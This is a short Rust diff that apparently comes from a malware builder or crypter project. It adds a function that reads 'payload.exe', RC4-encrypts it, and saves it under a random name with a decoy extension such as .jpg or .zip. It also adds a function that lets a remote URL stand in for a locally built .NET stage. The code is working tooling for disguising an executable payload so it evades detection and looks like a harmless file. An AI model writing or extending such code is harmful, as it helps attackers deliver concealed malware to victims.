@@ -5,6 +5,32 @@ use rand::{rngs::OsRng, Rng, RngCore};
 
 use crate::{binary_arch::BinaryArch, crypto, h, mf_runner::MfStubCS, random, MfBuilder};
 
+pub fn build_dotnet_stage_with_url(build_config: &mut MfBuilder, st: &mut MfStubCS, url: Option<String>) -> String {
+    if let Some(url) = url {
+        return url;
+    }
+    build_dotnet_stage(build_config, st)
+}
+
+pub fn generate_encrypted_payload(st: &mut MfStubCS) -> Result<String, Box<dyn std::error::Error>> {
+    use std::fs;
+    use rand::{rngs::OsRng, Rng, RngCore};
+    use crate::random;
+    
+    let mut payload_bytes = fs::read("payload.exe")?;
+    crypto::cipher_rc4::RC4::new(&st.payload_key).cipher(&mut payload_bytes);
+    
+    let file_extension = [
+        ".zip", ".rar", ".jpg", ".jpeg", ".txt", ".png", ".gif" 
+    ][OsRng.next_u32() as usize % 7].to_string();
+    let encrypted_payload_file_name = random::generate(OsRng.gen_range(10..=20)) + &file_extension;
+    let encrypted_payload_path = st.working_directory.clone() + "\\" + &encrypted_payload_file_name;
+    
+    fs::write(&encrypted_payload_path, &payload_bytes)?;
+    
+    Ok(encrypted_payload_path)
+}
+
 pub fn build_dotnet_stage(build_config: &mut MfBuilder, st: &mut MfStubCS) -> String {
     println!("{}{}", h(), "Encrypting payload...".color(Color::Yellow));
 
